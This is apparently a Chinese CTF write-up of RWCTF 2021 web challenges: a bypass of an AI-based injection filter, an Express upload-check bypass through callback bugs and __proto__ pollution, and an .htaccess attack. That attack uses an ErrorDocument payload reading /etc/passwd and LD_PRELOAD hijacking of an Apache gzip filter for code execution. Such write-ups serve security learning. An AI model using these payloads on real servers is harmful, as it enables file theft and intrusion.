<p><a href="https://www.cnblogs.com/Polar1dear/p/9354736.html">pgsql注入参考文章</a><br>说起来下次打的时候还是多翻翻文档好了。。。为什么我一开始会想到盲注而不是union或者堆叠呢。。。太奇怪了</p>
<h3 id="其他解"><a href="#其他解" class="headerlink" title="其他解"></a>其他解</h3><p>最后的flag是说可以日flask也可以日skynet，我们这种绕过人工智能的打法应该是日的skynet，一时没想出来怎么日flask，赛后逛discord发现使用formdata进行数据的提交，会使得flask.get_data()无法获取到用户提交的数据，但在后续查询时还是能被form.get获取到，这样子输入数据直接不会被skynet处理，随意注入</p>
<h2 id="RWDN"><a href="#RWDN" class="headerlink" title="RWDN"></a>RWDN</h2><p>难度是baby，实际上也不是很baby。。。我太弱了，但解数确实也有十几个</p>
<p>nodejs写的一个文件上传，传上去之后那个目录下有一个Apache的服务，白名单方式限制了文件后缀</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fileUpload <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-fileupload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> md5 <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> v4<span class="token punctuation">:</span> uuidv4 <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'uuid'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> check <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./check'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> PORT <span class="token operator">=</span> <span class="token number">8000</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> __dirname <span class="token operator">+</span> <span class="token string">'/views'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">fileUpload</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    useTempFiles <span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    tempFileDir <span class="token punctuation">:</span> <span class="token string">'/tmp/'</span><span class="token punctuation">,</span>
    createParentPath <span class="token punctuation">:</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>checkin<span class="token punctuation">)</span><span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">sendfile</span><span class="token punctuation">(</span><span class="token string">'/src/check.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    res<span class="token punctuation">.</span><span class="token function">sendfile</span><span class="token punctuation">(</span><span class="token string">'/src/server.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> formid <span class="token operator">=</span> <span class="token string">"form-"</span> <span class="token operator">+</span> <span class="token function">uuidv4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>formid <span class="token punctuation">:</span> formid<span class="token punctuation">}</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> sampleFile<span class="token punctuation">;</span>
    <span class="token keyword">let</span> uploadPath<span class="token punctuation">;</span>
    <span class="token keyword">let</span> userdir<span class="token punctuation">;</span>
    <span class="token keyword">let</span> userfile<span class="token punctuation">;</span>
    sampleFile <span class="token operator">=</span> req<span class="token punctuation">.</span>files<span class="token punctuation">[</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>formid<span class="token punctuation">]</span><span class="token punctuation">;</span>
    userdir <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>remoteAddress<span class="token punctuation">)</span> <span class="token operator">+</span> sampleFile<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">;</span>
    userfile <span class="token operator">=</span> sampleFile<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>userfile<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">||</span>userfile<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Invalid file name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    uploadPath <span class="token operator">=</span> <span class="token string">'/uploads/'</span> <span class="token operator">+</span> userdir <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> userfile<span class="token punctuation">;</span>
    sampleFile<span class="token punctuation">.</span><span class="token function">mv</span><span class="token punctuation">(</span>uploadPath<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File uploaded to http://47.243.75.225:31338/'</span> <span class="token operator">+</span> userdir <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> userfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>PORT<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Express server listening on port '</span><span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>check.js</p>
<pre class=" language-javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>formid <span class="token operator">||</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>files <span class="token operator">||</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>files<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Something error.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>files<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">var</span> filename <span class="token operator">=</span> req<span class="token punctuation">.</span>files<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">var</span> position <span class="token operator">=</span> filename<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>position <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">var</span> ext <span class="token operator">=</span> filename<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">var</span> allowexts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'.jpg'</span><span class="token punctuation">,</span><span class="token string">'.png'</span><span class="token punctuation">,</span><span class="token string">'.jpeg'</span><span class="token punctuation">,</span><span class="token string">'.html'</span><span class="token punctuation">,</span><span class="token string">'.js'</span><span class="token punctuation">,</span><span class="token string">'.xhtml'</span><span class="token punctuation">,</span><span class="token string">'.txt'</span><span class="token punctuation">,</span><span class="token string">'.realworld'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>allowexts<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>ext<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
                res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Something error.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h3><p>有两个解法，非预期更让人看得懂，预期解非常的高妙，就是这里的代码写的有点魔幻，导致高妙的预期解完全没有体现出来。</p>
<h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><p>首先是一开始的检测逻辑，测了一下formid之类的变量存不存在，不存在直接return终止，这里是没有问题的</p>
<p>然后接下来这个foreach，出题人写了非常多的垃圾代码，不止一个点有问题，把我绕晕了。这里注意，foreach是一个<strong>回调函数</strong>，这里面的return只是简单的终止了该回调函数而已，和前面的if判断的return完全不一样。。。如果这里的foreach不是回调函数而是for循环的话，这个return就和continue没什么区别。。。检测出来了也是无事发生，所以这个黑名单检测就已经变成笑话了</p>
<p>然后还有更雷的，只要上传的文件没有后缀或后缀在白名单中，直接return next();而实际的文件上传是通过用户提交的formid来确定文件的，只要我先连传两个文件，第一个是白名单文件，第二个是恶意文件，提交的formid是恶意文件的id，就能直接在第一个文件合格直接next到upload路由完成上传。。。</p>
<p>然而我看到了更奇葩的打法，随便传文件，只要有一个是合法的文件就行了，都不用考虑顺序，因为白名单检测是在foreach这个<strong>回调函数</strong>里面，先被check到了然后return也不会终止会话处理，虽然会被发一个res.send结束了tcp通信，但是程序逻辑还在跑啊?只要能跑到有一个文件过了检测直接进next，又能通过formid上传任意文件了。。。</p>
<p>仔细思考一下，这里的问题主要出现在那个回调函数上，我估计出题人也忘了那里是个回调函数，return;写了和没写一样。正确的写法大概是把return改成能直接结束当前会话处理的东西？<br>当然那个return next()也写的没救了，改成return;差不多，然后在函数的最后写一个return next()，应该逻辑就对了。。。</p>
<h4 id="something-else"><a href="#something-else" class="headerlink" title="something else"></a>something else</h4><p>我以前一直以为调用next就是直接把程序的控制流给交出去了，当前函数调用next就会直接跳出该函数去执行下一个函数。今天稍微debug了一下才发现，next只是简单的帮你调用下一个中间件而已，在那个中间件调用结束之后又会回到当前函数代码中，就是进行了一次简单的函数调用，如果要做到控制流的切换，就一定要使用return next()<br>举一个简单的例子，如果在一个for循环中调用next，会导致下一个中间件被循环执行，而要做到调用next就直接切换到下一个中间件中，需要使用return next()，Stack Overflow上有一个不错的回答<br><a href="https://stackoverflow.com/questions/16810449/when-to-use-next-and-return-next-in-node-js">When to use next() and return next() in Node.js</a></p>
<p>这也就解释了为什么非预期解中无论怎么上传都会回显something error，虽然写的是return next()，但是由于是在回调函数中调用。。。只是将回调函数的控制权移交了出去，当upload路由执行完之后还是会回到foreach循环中继续处理，而sampleFile.mv的上传成功应答也是一个回调函数，由于nodejs的event loop的原因被插在了任务队列中，直到forEach循环结束才轮到其执行，而forEach总会有一次循环到上传的恶意文件，然后return一个400和something error，等到sampleFile.mv应答成功信息时，会话早就结束了</p>
<h4 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h4><p>也是上传多个文件，其中一个文件的key为<code>__proto__</code>，Object.keys这个函数会主动忽略proto这类键，从而让这个文件直接不接受检测，但仍需要第二个合法文件，不然的话没法进next，但这个由于不会被白名单检测给发现，所以能正常返回文件上传的路径（因为路径是通过remote addr和文件md5生成的，所以非预期解中需要通过上传一个文件内容一模一样的合法文件来获取目录）</p>
<p>不过这里还是有一丝丝微妙，因为预期解中的formid并不是<code>__proto__</code>，而是数字1，也就是是这里并不是简单地用proto来隐藏恶意文件，req.file对象遭到了修改。<br>无法理解ing，需要进行简单的调试<br>但是我完全不会调试node。。。我甚至不知道当他启动之后我应该从哪进当前会话的各项属性的初始化。。。。<br>所以我大致猜测app的运行应该还是一个个中间件走过来的，那么文件上传的处理应该就在这里</p>
<pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">fileUpload</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    useTempFiles <span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    tempFileDir <span class="token punctuation">:</span> <span class="token string">'tmp/'</span><span class="token punctuation">,</span>
    createParentPath <span class="token punctuation">:</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>不过这里应该是指定了回调函数，直接在这下断点只会在启动时触发一次，直接进这个fileUpload的定义里面去下断点。一路跟进到processMultipart.js，这里面虽然看不太懂，但是应该还是以回调的方式注册了几个处理函数，在L122找到了req.files的赋值</p>
<pre class=" language-javascript"><code class="language-javascript">      req<span class="token punctuation">.</span>files <span class="token operator">=</span> <span class="token function">buildFields</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>files<span class="token punctuation">,</span> field<span class="token punctuation">,</span> <span class="token function">fileFactory</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      <span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>options<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>然后在buildFields中再下一个断点，开始调试<br>先看看这个函数长什么样</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> buildFields <span class="token operator">=</span> <span class="token punctuation">(</span>instance<span class="token punctuation">,</span> field<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
  <span class="token comment" spellcheck="true">// Do nothing if value is not set.</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> value <span class="token operator">===</span> undefined<span class="token punctuation">)</span> <span class="token keyword">return</span> instance<span class="token punctuation">;</span>
  instance <span class="token operator">=</span> instance <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token comment" spellcheck="true">// Non-array fields</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>instance<span class="token punctuation">[</span>field<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    instance<span class="token punctuation">[</span>field<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
    <span class="token keyword">return</span> instance<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token comment" spellcheck="true">// Array fields  </span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>instance<span class="token punctuation">[</span>field<span class="token punctuation">]</span> <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    instance<span class="token punctuation">[</span>field<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    instance<span class="token punctuation">[</span>field<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>instance<span class="token punctuation">[</span>field<span class="token punctuation">]</span><span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> instance<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p>这里的instance就是req.files，field是文件上传是的key，value是经过fileFactory函数处理过的文件对象。<br>逻辑很简单，如果instance的filed不存在，就直接进行赋值，如果存在，如果那个filed已经是一个数组，就把当前值push上去，如果不是数组，就把已存在的值和当前值拼成一个数组再赋值上去。<br>对于正常文件当然没有问题，但当field是__proto__时，场面就会有所变化，首先这个值一定是存在的，因此会进入第二个if，而req.files的proto是一个Object，不是Array，所以会将req.files的proto进行重新赋值，变为一个其原proto和上传的恶意文件的Obj的数组，如图所示</p>
<p><img src="/images/%5BRWCTF2021%5Dwp/image-20220124215158599.png" alt="image-20220124215158599"></p>
<p><img src="/images/%5BRWCTF2021%5Dwp/image-20220124214906087.png" alt="image-20220124214906087"></p>
<p>dda是我随便上传的另一个为触发next的有效文件</p>
<p>因此在进行上传formid访问时，Object.keys还是能获取到之前上传的dda，能成功进入到next()，但恶意文件被塞进proto，无法被检测，访问时使用下标，虽然req.file没有下标1的对象，但其proto已被修改，其对应1下标的对象即为恶意对象，完成上传并获取到路径</p>
<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>文件上传到的目录上运行了一个Apache服务，那唯一有可能的攻击方式就是传htaccess了</p>
<p>显然，这里应该不会简单到还给Apache配了PHP，一键打通未免太简单了。所以在Apache没有装PHP的情况下需要找到其他的可利用点，这里我直接在赛后discord里看到师傅们提到的ErrorDocument任意文件读<br>多翻Apache文档<br><a href="https://httpd.apache.org/docs/2.4/mod/core.html#errordocument">ErrorDocument</a></p>
<p>然后我直接写了个<code>ErrorDocument 404 /etc/passwd</code>，发现还是404，但报错是ErrorDocument时再次遭遇404，认真一看才发现这里的路径是直接接着网站根路径进行访问的，并不能读到整个文件系统</p>
<p>但是就在ErrorDocument的介绍里面有提到<a href="https://httpd.apache.org/docs/2.4/expr.html">expression syntax</a>可以在这里用于动态产生应答</p>
<p>点开看一眼，看到了几个比较关键的东西</p>
<blockquote>
<p>variable    ::&#x3D; “%{“ varname “}”<br>            | “%{“ funcname “:” funcargs “}”<br>file    Read contents from a file (including line endings, when present)</p>
</blockquote>
<p>任意文件读取有了<br><code>ErrorDocument 404 %&#123;file:/etc/passwd&#125;</code></p>
<p>在&#x2F;etc&#x2F;apache2&#x2F;apache2.conf下读取到Apache配置文件，在最后看到了这么一句<br><code>ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip</code><br>从来没见过的操作哦？这里应该就是利用点了</p>
<p>简单搜一下会直接搜到这个<br><a href="https://httpd.apache.org/docs/2.4/mod/mod_ext_filter.html">Apache Module mod_ext_filter</a></p>
<p>大抵就是说这个<code>ExtFilterDefine</code>会定义一个外部的程序对内容进行处理，这里用的是<code>/bin/gzip</code>，这个操作是新开进程的，所以使用强有力的RD_PRELOAD进行劫持RCE，<code>SetOutputFilter</code>项可以为输出定义对应的filter，配合<code>SetEnv</code>目录制定PD_PRELOAD，绕过上传恶意.so文件完成利用</p>
<p>setenv文档<br><a href="https://httpd.apache.org/docs/2.4/mod/mod_env.html">Apache Module mod_env</a></p>
<p>至于.so怎么写，就太经典了，不谈</p>
<h3 id="something-else-1"><a href="#something-else-1" class="headerlink" title="something else"></a>something else</h3><p>说起来怎么看Apache是否启用了PHP？似乎有的会在配置文件里面直接load对应的module，不过我感觉大部分自动安装的应该都是在&#x2F;etc&#x2F;apache2&#x2F;mods-enabled下面会有单独的PHP配置文件？我这里的就是一个php7.0.conf</p>
<h2 id="Secured-Java"><a href="#Secured-Java" class="headerlink" title="Secured Java"></a>Secured Java</h2><p>这个题说起来不是web来着，标签是misc和pwn。。。但是我没事做下了一下附件并发现是一个python+java的题，就决定试一下<br>当然没做出来</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> os
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> tempfile
<span class="token keyword">import</span> subprocess

SOURCE_FILE <span class="token operator">=</span> <span class="token string">"Main.java"</span>
DEP_FILE <span class="token operator">=</span> <span class="token string">"dep.jar"</span>


<span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">:</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Please send me the file {filename}."</span><span class="token punctuation">)</span>
    content <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"Content: (base64 encoded)"</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"Too long"</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> open<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>
        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the secured Java sandbox."</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> tempfile<span class="token punctuation">.</span>TemporaryDirectory<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> dir<span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>dir<span class="token punctuation">)</span>
        get_file<span class="token punctuation">(</span><span class="token string">"Main.java"</span><span class="token punctuation">)</span>
        get_file<span class="token punctuation">(</span><span class="token string">"dep.jar"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Compiling..."</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>
                <span class="token punctuation">[</span><span class="token string">"javac"</span><span class="token punctuation">,</span> <span class="token string">"-cp"</span><span class="token punctuation">,</span> DEP_FILE<span class="token punctuation">,</span> SOURCE_FILE<span class="token punctuation">]</span><span class="token punctuation">,</span>
                input<span class="token operator">=</span>b<span class="token string">""</span><span class="token punctuation">,</span>
                check<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
            <span class="token punctuation">)</span>
        <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>CalledProcessError<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Failed to compile!"</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Running..."</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"java"</span><span class="token punctuation">,</span> <span class="token string">"--version"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>
                <span class="token punctuation">[</span>
                    <span class="token string">"java"</span><span class="token punctuation">,</span>
                    <span class="token string">"-cp"</span><span class="token punctuation">,</span>
                    f<span class="token string">".:{DEP_FILE}"</span><span class="token punctuation">,</span>
                    <span class="token string">"-Djava.security.manager"</span><span class="token punctuation">,</span>
                    <span class="token string">"-Djava.security.policy==/dev/null"</span><span class="token punctuation">,</span>
                    <span class="token string">"Main"</span><span class="token punctuation">,</span>
                <span class="token punctuation">]</span><span class="token punctuation">,</span>
                check<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
            <span class="token punctuation">)</span>
        <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>CalledProcessError<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Failed to run!"</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>就是能输入两个内容，一个java文件和一个依赖jar包，python用subprocess来运行，但在运行时指定了<code>java.security.policy==/dev/null</code>，&#x2F;dev&#x2F;null读出来的结果永远是EOF，就等于是空文件，在policy被指定为空文件时等于关掉了所有权限。。。。</p>
